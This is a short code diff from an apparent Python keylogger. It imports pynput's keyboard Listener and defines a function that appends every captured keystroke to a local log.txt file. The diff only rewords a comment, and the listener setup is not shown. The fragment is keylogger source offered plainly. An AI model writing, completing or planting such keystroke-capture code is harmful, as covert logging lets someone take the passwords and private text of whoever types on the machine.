@@ -1,6 +1,6 @@
 from pynput.keyboard import Listener
 
-# Function to log keystrokes
+# Function to log keystrokes to a file
 def log_keystroke(key):
     key = str(key).replace("'", "") # Clean up key format
     with open("log.txt", "a") as log_file:
